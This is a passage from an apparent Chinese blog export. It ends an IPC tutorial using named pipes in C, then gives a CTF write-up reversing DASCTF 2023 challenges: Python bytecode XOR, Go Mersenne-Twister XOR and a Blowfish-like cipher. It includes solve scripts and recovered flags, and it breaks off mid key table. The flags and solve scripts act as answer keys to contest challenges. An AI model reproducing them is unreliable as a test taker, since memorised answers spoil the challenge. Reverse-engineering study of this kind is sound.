&#123; int fd; int ret; ret = mkfifo(\"my_fifo\", 0666); // 创建命名管道 if(ret != 0) &#123; perror(\"mkfifo\"); &#125; fd = open(\"my_fifo\", O_WRONLY); // 等着只读 if(fd &lt; 0) &#123; perror(\"open fifo\"); &#125; char send[100] = \"Hello World\"; write(fd, send, strlen(send)); // 写数据 printf(\"write to my_fifo buf=%s\\n\",send); while(1); // 阻塞，保证读写进程保持着通信过程 close(fd); return 0; &#125;// FIFOread.c#include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #include &lt;fcntl.h> int main(int argc, char *argv[]) &#123; int fd; int ret; ret = mkfifo(\"my_fifo\", 0666); // 创建命名管道 if(ret != 0) &#123; perror(\"mkfifo\"); &#125; fd = open(\"my_fifo\", O_RDONLY); // 等着只写 if(fd &lt; 0) &#123; perror(\"open fifo\"); &#125; while(1) &#123; char recv[100] = &#123;0&#125;; read(fd, recv, sizeof(recv)); // 读数据 printf(\"read from my_fifo buf=[%s]\\n\", recv); sleep(1); &#125; close(fd); return 0; &#125;# 参考资料 6 种 Linux 进程间的通信方式 Linux 进程间通信 —— 使用消息队列 linux 多线程之信号量 sem_init Linux 信号量详解 进程间通信 —POSIX 信号量实现机制 有名信号量 —— 无关进程间同步 利用信号量 semaphore 实现两个进程读写同步 Linux 进程间通信 —— 使用共享内存 Linux：带你理解进程间通信–管道 进程间通信之管道（pipe）和命名管道（FIFO）","categories":[],"tags":[{"name":"进程通信","slug":"进程通信","permalink":"https://oacia.dev/tags/%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/"},{"name":"信号量","slug":"信号量","permalink":"https://oacia.dev/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"name":"消息队列","slug":"消息队列","permalink":"https://oacia.dev/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"管道","slug":"管道","permalink":"https://oacia.dev/tags/%E7%AE%A1%E9%81%93/"},{"name":"共享内存","slug":"共享内存","permalink":"https://oacia.dev/tags/%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98/"}]},{"title":"DASCTF Apr.2023 X SU战队2023开局之战 reverse&&blockchain writeup","slug":"DASCTF-Apr-2023-X-SU战队2023开局之战-reverse-blockchain-writeup","date":"2023-04-22T11:15:52.000Z","updated":"2025-04-08T18:55:11.386Z","comments":true,"path":"DASCTF-Apr-2023-X-SU战队2023开局之战-reverse-blockchain-writeup/","link":"","permalink":"https://oacia.dev/DASCTF-Apr-2023-X-SU%E6%88%98%E9%98%9F2023%E5%BC%80%E5%B1%80%E4%B9%8B%E6%88%98-reverse-blockchain-writeup/","excerpt":"","text":"今天坐牢坐满了八小时，出了三道逆向，一道区块链，帮助我们队拿到了这次比赛的第一名，也算可喜可贺！自己终于不是以前的菜鸡了，遥想去年还啥也不会呢 现在比赛结束了，那就写一下 wp 好咯 PS: 第一次拿到一道困难题的一血，还是很激动的，有一道题目我记得叫做 easyRE，拿了二血是因为吃饭吃到 10 点多才开始做题了，下次一定准时比赛！（下次一定 (●’◡’●)） 题目附件: 点击下载 # reverse # easyRE 这题是 python 逆向，做 python 逆向的方法我感觉挺固定的，就是 pyinstxtractor 解包一下，再把里面的 pyc 转成 py 就可以了 今年年初的时候还对 python 逆向做了些整理呢，可以看看我博客的这篇文章 回到题目，这题呀要怎么刁难我们呢？没错，就是 python3.11 这个版本挺新的，我相信你不管是用 uncompyle6 还是 pycdc 还是在线网站，应该都会遇到反编译失败的情况，那么这个时候我们该怎么办呢？ 其实是有方法的，首先，我们可以用如下的 python 代码得到这个 pyc 的字节码 import disimport marshalwith open('easyRE.pyc', 'rb') as f: f.seek(16) dis.dis(marshal.load(f))0 0 RESUME 0 1 2 LOAD_CONST 0 (0) 4 LOAD_CONST 1 (None) 6 IMPORT_NAME 0 (random) 8 STORE_NAME 0 (random) 3 10 PUSH_NULL 12 LOAD_NAME 0 (random) 14 LOAD_ATTR 1 (Random) 24 LOAD_CONST 2 (322376503) 26 PRECALL 1 30 CALL 1 40 STORE_NAME 2 (r) 6 42 PUSH_NULL 44 LOAD_NAME 3 (input) 46 LOAD_CONST 3 ('Enter your flag: ') 48 PRECALL 1 52 CALL 1 62 LOAD_METHOD 4 (encode) 84 PRECALL 0 88 CALL 0 98 STORE_NAME 5 (pt) 8 100 LOAD_CONST 4 (b'\\x8b\\xcck\\xd3\\xed\\x96\\xffFb\\x06r\\x085\\x82\\xbc \\xb2\\xde)p\\x88Q`\\x1bf\\x18\\xb6QUSw\\x10\\xcd\\xd9\\x13A$\\x86\\xe5\\xcd\\xd9\\xff') 102 STORE_NAME 6 (ct) 10 104 BUILD_LIST 0 106 STORE_NAME 7 (buf) 12 108 LOAD_NAME 5 (pt) 110 GET_ITER >> 112 FOR_ITER 46 (to 206) 114 STORE_NAME 8 (b) 13 116 LOAD_NAME 7 (buf) 118 LOAD_METHOD 9 (append) 140 LOAD_NAME 2 (r) 142 LOAD_METHOD 10 (randint) 164 LOAD_CONST 0 (0) 166 LOAD_CONST 5 (255) 168 PRECALL 2 172 CALL 2 182 LOAD_NAME 8 (b) 184 BINARY_OP 12 (^) 188 PRECALL 1 192 CALL 1 202 POP_TOP 204 JUMP_BACKWARD 47 (to 112) 15 >> 206 PUSH_NULL 208 LOAD_NAME 11 (bytes) 210 LOAD_NAME 7 (buf) 212 PRECALL 1 216 CALL 1 226 LOAD_NAME 6 (ct) 228 COMPARE_OP 2 (==) 234 POP_JUMP_FORWARD_IF_TRUE 2 (to 240) 236 LOAD_ASSERTION_ERROR 238 RAISE_VARARGS 1 17 >> 240 PUSH_NULL 242 LOAD_NAME 12 (print) 244 LOAD_CONST 6 ('Correct!') 246 PRECALL 1 250 CALL 1 260 POP_TOP 262 LOAD_CONST 1 (None) 264 RETURN_VALUE到了这一步其实就可以做题了，但是或许有小伙伴一看到字节码头都大了 这时就要请出我们神奇的 chatgpt 了，网址在这里 https://chat.openai.com/ 直接把字节码丢给他然后说：给我转成 py 代码！ 然后 chatgpt 就会刷刷刷的给出 py 源代码 import randomr = random.Random(322376503)pt = input('Enter your flag: ').encode()ct = b'\\x8b\\xcck\\xd3\\xed\\x96\\xffFb\\x06r\\x085\\x82\\xbc \\xb2\\xde)p\\x88Q`\\x1bf\\x18\\xb6QUSw\\x10\\xcd\\xd9\\x13A$\\x86\\xe5\\xcd\\xd9\\xff'buf = []for b in pt: buf.append(r.randint(0, 255) ^ b)assert bytes(buf) == ctprint('Correct!')这一看随机数种子都固定了，那随机数其实就不随机了 基于题目的代码改一改就是 flag 了 import randomr = random.Random(322376503)pt = input('Enter your flag: ').encode()ct = b'\\x8b\\xcck\\xd3\\xed\\x96\\xffFb\\x06r\\x085\\x82\\xbc \\xb2\\xde)p\\x88Q`\\x1bf\\x18\\xb6QUSw\\x10\\xcd\\xd9\\x13A$\\x86\\xe5\\xcd\\xd9\\xff'for k in ct: print(chr(r.randint(0, 255) ^ k),end='')# flag&#123;69858b56-4987-438f-a02c-5ab5c09e5138&#125;# gotots 这题是一道 go 语言的逆向题，做这种 go 语言的题目，其实把那些函数都给复原就相当好做了 (做 go 逆向找不到 main_main 就好像…emmm 想不出来用什么比喻好了 qwq) 所以我们首先要做的是还原函数名称，用这个 ida 脚本就可以了 https://github.com/renshareck/IDAGolangHelper_SupportGo1.20 然后按照下图的流程依次点击按钮 还原之后发现是梅森旋转算法随机数生成器，这是一个伪随机数生成器，每次异或的值都是一样的 那就随便输入一个字符串比如我这里输入的是 0000000000000000000000000000000000000000000000 , 然后打个断点把异或后的那个数组复制下来，然后再去异或后面要比较的数组，这样就可以拿到 flag 了 挺简单的题目，直接给 exp 吧 testinput = \"0000000000000000000000000000000000000000000000\"byte = [0x67, 0x88, 0xBE, 0x8C, 0x79, 0xAB, 0x7C, 0xB7, 0x5F, 0xD3, 0x24, 0xD0, 0x16, 0xF0, 0x02, 0x8D, 0x5C, 0xF7, 0xB5, 0x16, 0xD2, 0x69, 0xDE, 0xA6, 0xE1, 0x5F, 0xA1, 0xA5, 0x7F, 0x6C, 0x78, 0x70, 0x76, 0x88, 0x75, 0x2E, 0x2F, 0x30, 0x99, 0x61, 0x5A, 0xD1, 0xBF, 0x71, 0x7A, 0x4E]key = [0x35, 0x8C, 0xEB, 0x85, 0x2C, 0xFA, 0x2D, 0xB1, 0x42, 0x82, 0x27, 0xD0, 0x10, 0xED, 0x06, 0x8E, 0x0D, 0xFE, 0xA8, 0x1E, 0x81, 0x3C, 0x8A, 0xBB, 0xB7, 0x0B, 0xF4, 0xF0, 0x7C, 0x6B, 0x70, 0x26, 0x71, 0x8B, 0x73, 0x7D]for i in range(len(key)): print(chr(ord(testinput[i])^byte[i]^key[i]),end='')# b4e9eaa6-a306-43a9-8ced-fdee378f736c# multi-universe 这题拿了一血 (没想到我也有拿一血的一天！肯定是大佬们还没有发力唔) 这题呀也是 go 逆向，不过就是和 c 代码交叉编译了一下 同样，第一步还是恢复函数名称，可以用这个 ida 脚本 https://github.com/0xjiayu/go_parser , 然后就可以了，这里运行脚本之后可能会卡住，不过没关系，cancel 掉脚本，函数名称一样可以恢复过来 之后呐就是随便输入一个 40 位的字符串，然后在输入后的字符串的内存地址处打个硬件断点，动态调试之后断点一路触发下去，跟到这个函数 sub_7FF631BCF2E0 , 我觉得你有可能找不到这个函数因为动态调试后基址可能不一样，我的基址是 0x7FF631B30000 , 如果你找不到加密函数的话在 ida 里面换成我这个基址就可以找得到了 (什么你不会换基址？！跟着我来：在 ida 左上角找到 Edit -&gt; Segments -&gt; Rebase program 然后把我这个基址输进去就可以了) 这个函数的伪代码如下 unsigned int *__fastcall sub_7FF631BCF2E0(void *a1, __int64 a2, unsigned int *a3, _DWORD *a4, size_t a5, int a6)&#123; unsigned int *v7; // rcx unsigned __int64 v8; // rsi unsigned int *result; // rax unsigned int *v10; // r8 unsigned int v11; // r9d int v12; // ecx unsigned int v13; // ecx int v14; // edx unsigned int v15; // edx int v16; // ecx unsigned int v17; // ecx int v18; // edx unsigned int v19; // edx int v20; // ecx unsigned int v21; // ecx int v22; // edx unsigned int v23; // edx int v24; // ecx unsigned int v25; // ecx int v26; // edx unsigned int v27; // edx int v28; // ecx unsigned int v29; // ecx int v30; // edx unsigned int v31; // edx int v32; // ecx unsigned int v33; // ecx int v34; // edx unsigned int v35; // edx int v36; // ecx unsigned int v37; // ecx int v38; // edx unsigned int v39; // edx unsigned int v40; // r9d __m128i v41; // xmm5 int v42; // edx unsigned int v43; // edx int v44; // ecx v7 = a3; v8 = a6; if ( a3 != (unsigned int *)a5 ) v7 = (unsigned int *)memcpy(a1, (const void *)a6, a5); result = v7; v10 = (unsigned int *)((char *)v7 + (v8 &amp; 0xFFFFFFFFFFFFFFF8LL)); if ( v8 >> 3 ) &#123; do &#123; v11 = *a4 ^ *result; *result = v11; v12 = result[1] ^ (a4[(unsigned __int8)v11 + 786] + (a4[BYTE1(v11) + 530] ^ (a4[HIBYTE(v11) + 18] + a4[BYTE2(v11) + 274]))); *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v12), _mm_cvtsi32_si128(v11)).m128i_u64[0]; v13 = a4[1] ^ v12; *result = v13; v14 = v11 ^ (a4[(unsigned __int8)v13 + 786] + (a4[BYTE1(v13) + 530] ^ (a4[HIBYTE(v13) + 18] + a4[BYTE2(v13) + 274]))); *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v14), _mm_cvtsi32_si128(v13)).m128i_u64[0]; v15 = a4[2] ^ v14; *result = v15; v16 = (a4[(unsigned __int8)v15 + 786] + (a4[BYTE1(v15) + 530] ^ (a4[HIBYTE(v15) + 18] + a4[BYTE2(v15) + 274]))) ^ v13; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v16), _mm_cvtsi32_si128(v15)).m128i_u64[0]; v17 = a4[3] ^ v16; *result = v17; v18 = (a4[(unsigned __int8)v17 + 786] + (a4[BYTE1(v17) + 530] ^ (a4[HIBYTE(v17) + 18] + a4[BYTE2(v17) + 274]))) ^ v15; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v18), _mm_cvtsi32_si128(v17)).m128i_u64[0]; v19 = a4[4] ^ v18; *result = v19; v20 = (a4[(unsigned __int8)v19 + 786] + (a4[BYTE1(v19) + 530] ^ (a4[HIBYTE(v19) + 18] + a4[BYTE2(v19) + 274]))) ^ v17; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v20), _mm_cvtsi32_si128(v19)).m128i_u64[0]; v21 = a4[5] ^ v20; *result = v21; v22 = (a4[(unsigned __int8)v21 + 786] + (a4[BYTE1(v21) + 530] ^ (a4[HIBYTE(v21) + 18] + a4[BYTE2(v21) + 274]))) ^ v19; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v22), _mm_cvtsi32_si128(v21)).m128i_u64[0]; v23 = a4[6] ^ v22; *result = v23; v24 = (a4[(unsigned __int8)v23 + 786] + (a4[BYTE1(v23) + 530] ^ (a4[HIBYTE(v23) + 18] + a4[BYTE2(v23) + 274]))) ^ v21; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v24), _mm_cvtsi32_si128(v23)).m128i_u64[0]; v25 = a4[7] ^ v24; *result = v25; v26 = (a4[(unsigned __int8)v25 + 786] + (a4[BYTE1(v25) + 530] ^ (a4[HIBYTE(v25) + 18] + a4[BYTE2(v25) + 274]))) ^ v23; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v26), _mm_cvtsi32_si128(v25)).m128i_u64[0]; v27 = a4[8] ^ v26; *result = v27; v28 = (a4[(unsigned __int8)v27 + 786] + (a4[BYTE1(v27) + 530] ^ (a4[HIBYTE(v27) + 18] + a4[BYTE2(v27) + 274]))) ^ v25; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v28), _mm_cvtsi32_si128(v27)).m128i_u64[0]; v29 = a4[9] ^ v28; *result = v29; v30 = (a4[(unsigned __int8)v29 + 786] + (a4[BYTE1(v29) + 530] ^ (a4[HIBYTE(v29) + 18] + a4[BYTE2(v29) + 274]))) ^ v27; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v30), _mm_cvtsi32_si128(v29)).m128i_u64[0]; v31 = a4[10] ^ v30; *result = v31; v32 = (a4[(unsigned __int8)v31 + 786] + (a4[BYTE1(v31) + 530] ^ (a4[HIBYTE(v31) + 18] + a4[BYTE2(v31) + 274]))) ^ v29; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v32), _mm_cvtsi32_si128(v31)).m128i_u64[0]; v33 = a4[11] ^ v32; *result = v33; v34 = (a4[(unsigned __int8)v33 + 786] + (a4[BYTE1(v33) + 530] ^ (a4[HIBYTE(v33) + 18] + a4[BYTE2(v33) + 274]))) ^ v31; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v34), _mm_cvtsi32_si128(v33)).m128i_u64[0]; v35 = a4[12] ^ v34; *result = v35; v36 = (a4[(unsigned __int8)v35 + 786] + (a4[BYTE1(v35) + 530] ^ (a4[HIBYTE(v35) + 18] + a4[BYTE2(v35) + 274]))) ^ v33; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v36), _mm_cvtsi32_si128(v35)).m128i_u64[0]; v37 = a4[13] ^ v36; *result = v37; result += 2; v38 = (a4[(unsigned __int8)v37 + 786] + (a4[BYTE1(v37) + 530] ^ (a4[HIBYTE(v37) + 18] + a4[BYTE2(v37) + 274]))) ^ v35; *((_QWORD *)result - 1) = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v38), _mm_cvtsi32_si128(v37)).m128i_u64[0]; v39 = a4[14] ^ v38; *(result - 2) = v39; v40 = v39; v41 = _mm_cvtsi32_si128(v39); v42 = v37 ^ (a4[(unsigned __int8)v39 + 786] + ((a4[HIBYTE(v39) + 18] + a4[BYTE2(v39) + 274]) ^ a4[BYTE1(v39) + 530])); *((_QWORD *)result - 1) = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v42), v41).m128i_u64[0]; v43 = a4[15] ^ v42; *(result - 2) = v43; v44 = v40 ^ (a4[(unsigned __int8)v43 + 786] + (a4[BYTE1(v43) + 530] ^ (a4[HIBYTE(v43) + 18] + a4[BYTE2(v43) + 274]))); *((_QWORD *)result - 1) = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v43), _mm_cvtsi32_si128(v44)).m128i_u64[0]; *(result - 1) = a4[16] ^ v44; *(result - 2) = a4[17] ^ v43; &#125; while ( result != v10 ); &#125; return result;&#125;这个加密也是有迹可循的，就是异或来～异或去，你可以把这个加密看成很多下方代码块的重复 v11 = *a4 ^ *result; *result = v11; v12 = result[1] ^ (a4[(unsigned __int8)v11 + 786] + (a4[BYTE1(v11) + 530] ^ (a4[HIBYTE(v11) + 18] + a4[BYTE2(v11) + 274]))); *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v12), _mm_cvtsi32_si128(v11)).m128i_u64[0];这个算法要注意 (unsigned __int8) , BYTE1 , HIBYTE , BYTE2 表示的含义 假设 v11=0x12345678 , 那么 (unsigned __int8)v11 = 0x78 BYTE1(v11) = 0x56 HIBYTE(v11) = 0x12 BYTE2(v11) = 0x34 while 循环最后的两个异或也不能忽略 *(result - 1) = a4[16] ^ v44;*(result - 2) = a4[17] ^ v43;提醒一点，当你在 result 数组的内存地址打下硬件断点后，会发现这个函数执行完毕后，后面还有一个小型的加密 记得也要把这个循环左移三位再异或也体现到 exp 里面去 那就可以写出 exp 来了 import ctypesimport binasciidef deal_last_rev(hex_num): # hex_num = 0x9DDC359E byte1 = (hex_num >> 24) &amp; 0xFF byte2 = (hex_num >> 16) &amp; 0xFF byte3 = (hex_num >> 8) &amp; 0xFF byte4 = hex_num &amp; 0xFF byte1 = ctypes.c_uint8(byte1) byte1.value ^= 0x0C # print(bin(byte1.value)) byte1.value = ((byte1.value&lt;&lt;5)&amp;0xff)|((byte1.value>>3)&amp;0xff) # print(bin(byte1.value)) byte2 = ctypes.c_uint8(byte2) byte2.value ^= 0x0C byte2.value = ((byte2.value&lt;&lt;5)&amp;0xff)|((byte2.value>>3)&amp;0xff) byte3 = ctypes.c_uint8(byte3) byte3.value ^= 0x0C byte3.value = ((byte3.value&lt;&lt;5)&amp;0xff)|((byte3.value>>3)&amp;0xff) byte4 = ctypes.c_uint8(byte4) byte4.value ^= 0x0C byte4.value = ((byte4.value&lt;&lt;5)&amp;0xff)|((byte4.value>>3)&amp;0xff) result = (byte1.value &lt;&lt; 24) | (byte2.value &lt;&lt; 16) | (byte3.value &lt;&lt; 8) | byte4.value return resultdef rrev(hex_num): byte1 = (hex_num >> 24) &amp; 0xFF byte2 = (hex_num >> 16) &amp; 0xFF byte3 = (hex_num >> 8) &amp; 0xFF byte4 = hex_num &amp; 0xFF result = (byte4 &lt;&lt; 24) | (byte3 &lt;&lt; 16) | (byte2 &lt;&lt; 8) | byte1 return resulta4 = [0x2FE994E0, 0xC11E954B, 0xF00E449D, 0xDA7858A1, 0xCEF89B0A, 0xB06F5FD9, 0x32646DF2, 0x3D31F55A, 0xE90EC568, 0xF69C53B7, 0x3F2C9C44, 0x6DD31BC7, 0xF4AF32ED, 0x4381F9C7, 0x26EB634F, 0xE5FBA3CF, 0xAB36B7FB, 0xB295A35B, 0x732F94D5, 0xEEC6C173, 0x572989EB, 0xCB9DDFD9, 0xAF9F559B, 0xFC9A4D99, 0xE14B9327, 0x3A04B794, 0x588C93A9, 0xB75B93DF, 0xFC906662, 0x7043911C, 0x71F1F968, 0xAEC02345, 0x642C0A73, 0xE92FD10A, 0xF749BE48, 0x02C776F8, 0x78D847B6, 0xD9D395EA, 0xC091094D, 0x5ED1A899, 0x8535B464, 0xC9B571E4, 0xD5974F29, 0x69BF7AC2, 0x78862ED1, 0xAEA837DD, 0x4D8BF9B9, 0x358766D5, 0x0194484B, 0xB2C46C77, 0xA5B3F500, 0x21B29753, 0xC8BE07B5, 0x9B982150, 0xAAB0F261, 0xC54587BA, 0x5FE3F7A2, 0xB94325DF, 0x814B1991, 0x05A7CBC5, 0xC01E7032, 0x2D802ED9, 0xF920C022, 0xDC7AAE97, 0x3904A61F, 0x8A725DE7, 0x9E49A196, 0xF7AE5DF0, 0x19EB724A, 0x03FB7CF7, 0x2F9234AF, 0x72006306, 0x9123B54C, 0xB8164574, 0x69438E25, 0xD56F49D2, 0x681CB159, 0x8CDADDF4, 0xFCE82189, 0x50A905D4, 0x9386E52A, 0xCACC2368, 0x38B3A6A3, 0x3CA0DF37, 0xF51D7DD5, 0x24242D86, 0x7F8D441B, 0xD6E5BBA6, 0x263CBCD8, 0xE3ADDED7, 0x6D543F5E, 0x4716D72F, 0x2799B4E3, 0xA80B339E, 0x2A9A3565, 0x812ECA54, 0x58A9D96E, 0xCF3ACC39, 0x2777DC51, 0x520F1EF8, 0xF4A2399E, 0x0BB7A943, 0x9BB2287A, 0x074C750B, 0xE89F260C, 0xF39494C9, 0x62154805, 0x2869BB07, 0x71D3C65F, 0x83F883C6, 0x179A9696, 0xD53E6014, 0x28A45FBB, 0x565C9FD2, 0x4CC74F44, 0x50FD664A, 0x0789A88D, 0x7454AE55, 0x4AD93102, 0xC4C64C97, 0x146A16C5, 0xA6337621, 0x601474DD, 0xD9CCBFA2, 0xD628928F, 0xEC0EF727, 0x4E728F4C, 0x6D394E22, 0x23252BC3, 0x410DB272, 0x60C5467F, 0x28C58C78, 0x45B98E47, 0x2D453756, 0x9FC502FE, 0x2FAAA75C, 0xFECC881C, 0xC98742BD, 0x18FAB5A0, 0x96A2691B, 0x265C4ABE, 0x22E5221D, 0x79F147B5, 0xA4963A5A, 0x38A53CE1, 0xC5899BDF, 0xAFBEDE5A, 0xED2EF97D, 0x212A53AC, 0x2E7141D6, 0x2FCF2D57, 0xEFB9869F, 0xD4665961, 0x231BB16A, 0x12EF4976, 0x7DAF240E, 0x3B96114A, 0xD27BB394, 0x357215CD, 0xA4AAEF55, 0x17E76552, 0x6F57C2DD, 0x83ED82E0, 0xCAABAEA5, 0xE7F5B748, 0xAB0E7982, 0x54435C78, 0x366A7F66, 0x7F94D113, 0x0D96FFBB, 0x2A795FF7, 0x2641EF7A, 0x73C2CB56, 0x701792C4, 0x1CCD9DF5, 0x156882B1, 0x888343F4, 0xE22DB762, 0x9E4CCB4B, 0x21517A50, 0x072F9091, 0x3E06A3DE, 0x311619DD, 0xA0AB192D, 0x5F0D5CF1, 0xF05FCFEA, 0xE36DEA48, 0x3FC54006, 0xBA8849A7, 0xB32DC878, 0xC1FEF774, 0xE34A6EDB, 0x770A2D0D, 0xCDF8D3DC, 0x7EBE066A, 0x603CD5BC, 0x4C6B5E7B, 0x12E80727, 0xFB69C765, 0x87A42B29, 0xE73A641F, 0xD586AB9B, 0x3BB112B3, 0x59AF1110, 0x1F6FACFB, 0x52597DF3, 0x28EF38D8, 0xBA0432C7, 0x958FDEA9, 0x68678326, 0x2161A62B, 0x44C8C4A0, 0xB1D7A078, 0x205CA9E3, 0xD4B8C306, 0x63F9157D, 0x4AEDA561, 0xFB84C9D6, 0xD8988F07, 0xF21A9841, 0xF4E71FB2, 0x63232B2E, 0x6EBA9AFE, 0x2DAFE02C, 0xDCC6655E, 0xFDB3B0DE, 0x044C3EAD, 0x10468B3E, 0xDA71D948, 0x6BACCBE4, 0x9A7844FC, 0xDF7FE345, 0xCB06712C, 0x034AC145, 0x510E9532, 0x71EAFBC2, 0x44433456, 0xCB01159D, 0x4A1957DD, 0x73C8DF17, 0xC8DB9516, 0x1ADB1906, 0x676BCEC1, 0x08DAC3C4, 0x3CAD32A1, 0xD737D4F3, 0x20ACDE94, 0xAB6D02F3, 0x506E5C37, 0xEDF08E37, 0x668C8DD5, 0xEA33C67D, 0x35308BA4, 0x67F0A8BA, 0x166546B5, 0x38D06E3F, 0x68159FEC, 0x1CEC8FA1, 0x9917E8B9, 0x376C0882, 0x9AADF201, 0x42DACD9C, 0x37663273, 0x51639640, 0x3CA96C41, 0xFD7E97CE, 0x174CAD5D, 0xA7A5F995, 0x2C36EB62, 0x7AFCFC30, 0x23DC7E23, 0xD742DA78, 0x03D27CB1, 0x7E9EDC0A, 0x6A0FB256, 0x4FCDB0EF, 0x26CAB2D4, 0x095BA999, 0x839CB8C4, 0x288AE59D, 0x1F033326, 0x5E8761CF, 0x0648ED4C, 0x98C49A53, 0xE3C0390D, 0xAD642407, 0xBD269591, 0x32A2E629, 0xE3122457, 0x5D73ED1C, 0x33A26E04, 0x2E67DE60, 0x6F2B18E3, 0x4558EADB, 0xDBA1D8B3, 0x9CADF7B5, 0x5FFBB4EF, 0x805AD7D1, 0xFF84E641, 0x4D49B28B, 0x2A28EA66, 0x7BC6FA3C, 0x266731FC, 0x3AB4D8DA, 0xB43EB68E, 0x9C4D6F43, 0x1CCE439F, 0xB625A0CE, 0x4B78AF95, 0xD06A3FF7, 0x5C8A2078, 0xFD9FA69D, 0x7BF98A71, 0xEE90B86D, 0xA442A73A, 0xB5A4A212, 0xA8E481F6, 0x4C6FD0BD, 0xA7706FB4, 0x3569127F, 0x59DFADB6, 0x2AB4FB23, 0x3604808A, 0xF3779794, 0xAA5A7EDF, 0x2ECF97BA, 0x969504A5, 0xCD05B77F, 0x5321DB1D, 0xD8BABA9C, 0x7A97EF53, 0x37231A53, 0x366BFEC5, 0x9BD96A49, 0x5A6C7F46, 0xE47BD143, 0x13FD722B, 0xF9A52E09, 0x6420A5BC, 0x8A8BB90C, 0x8234235E, 0x215EC40C, 0x46790597, 0x825EA222, 0xB783D749, 0x24A8815F, 0x2F74A78E, 0xD9E403D4, 0x63E17B10, 0xB6226CEF, 0x0E0F4381, 0xCA7D3369, 0x728C9C6B, 0xB14ECC63, 0x991A0F0E, 0xB0422615, 0x4C2FD823, 0x3302908B, 0xBAAF7739, 0x357EF5BC, 0x4CC6687F, 0xDD2F23B7, 0xA3AC1329, 0xC167B555, 0xE1F9B87B, 0x2B65D3B4, 0x4368817B, 0x03DAF56A, 0x9AE59AB9, 0xF5EAC7EE, 0xB36417A7, 0xF8FC224A, 0xA7E519FE, 0x8637329C, 0xB21461FD, 0xAED97750, 0x8744167F, 0x4669E638, 0x4E1B3B1A, 0xD377B3F7, 0xF514B3B6, 0x707A415C, 0x0AB652F0, 0xBC513A6D, 0x4FCE3F92, 0x96CBEE70, 0x31351026, 0xD37A9F73, 0x4DD00F9E, 0x047C1B22, 0x071DF745, 0x3A7697BE, 0xE24EDC03, 0x37233D96, 0x02373DD2, 0x26396C2B, 0x2229D430, 0x770CE3E3, 0xDE942CD0, 0x3F79B030, 0x5149DB45, 0x67FFE1C5, 0x78F66A56, 0x0E2313EA, 0xE13FE0C7, 0xA0C51FC4, 0xC11D9CA7, 0x709A60B2, 0x32EC174F, 0xC8CA5D05, 0x3351393B, 0x57846D6C, 0x22834834, 0x0FFA5DFE, 0x95DB516A, 0xC61E38F0, 0x15A3EE21, 0x4A587F75, 0x5BE749D7, 0xBBF167D7, 0x7334E07D, 0x09606180, 0x8BB6560E, 0xD35FFC0F, 0x34DCFBCC, 0x3E98BA62, 0x8A33C7EF, 0x19763E8B, 0x01FA474D, 0x529A6743, 0xF65D218C, 0xE0D70194, 0xBC879FCC, 0xE9DB6228, 0x07D566B6, 0x4C1B0D84, 0x945ABD96, 0xD1196C6E, 0x81EE67CC, 0xAD1721AE, 0xC987453F, 0x063CEB9F, 0xB27F0A73, 0xB5997727, 0x69D5B851, 0x02F7D0A1, 0x074F31CB, 0x53088D46, 0xBF2D83C4, 0x6C75BC86, 0x3B888596, 0x2EA614FE, 0x9E16DD01, 0xED1F5D7C, 0x9916A175, 0xD610A890, 0x7DF08F91, 0x435A4D29, 0xB7B5E450, 0x76FA8AAC, 0x050ADB83, 0x9CF8C712, 0xF08E8112, 0x9BAC9884, 0x5568DDC3, 0x4BE91FFE, 0x5B230AA2, 0x6BFDA2E9, 0xD26E1DFB, 0xF24668C7, 0x5464086A, 0xFFBB1CF3, 0x13313B25, 0x04D2D867, 0x5C47617D, 0x33A3150D, 0x007C3A17, 0x87DF6435, 0x8937F0DF, 0x3A707415, 0x3B2CFAE3, 0xC46C894B, 0xA0BE1104, 0xE2BECABC, 0xE42FDEED, 0x21913FA9, 0x1C30A346, 0x12758853, 0x57143736, 0x67E8119A, 0xD49D2036, 0x56AC8659, 0xA2DBB273, 0xFAB5912A, 0x75903A11, 0x9F1CC55A, 0x12554844, 0x658813AD, 0xBA08D453, 0x93AD4948, 0xEDDC0E10, 0xE25B6FD1, 0x9DF9AFCC, 0x2E98B6A2, 0x731A29AB, 0x930F9D67, 0x4771AC8E, 0xDFE58864, 0x4B572200, 0x67C22CE4, 0x1C5CB393, 0x7F18DC62, 0xBAFE6E58, 0x8F157813, 0xEDBB60E4, 0x17CC1A84, 0x5F7D0A2E, 0x64091858, 0x7BAF9420, 0xE1C89AA7, 0x525DF47C, 0x12CDE243, 0x0E25EC45, 0x9B36BC9F, 0x78B1715D, 0x962F9E9F, 0x7C18C853, 0xF1A8E5E3, 0x3C7FA3EE, 0xC119713F, 0x499EBAED, 0x71E46262, 0x9E42E3EF, 0x46C80691, 0xE4B23574, 0xF5BABE2B, 0x5B2C9A33, 0x296DFA2B, 0x9CEC6D11, 0x4B8A27BF, 0xC1C9FAE3, 0xFE7DCB7D, 0x58EBCAFE, 0xAFC4FB8C, 0xC277EB5C, 0x3176F3AC, 0xBC6DD7C1, 0x92E42C52, 0x18381B68, 0xB6ADFC6F, 0x7F477C10, 0xD43CCEDC, 0x1FA5633B, 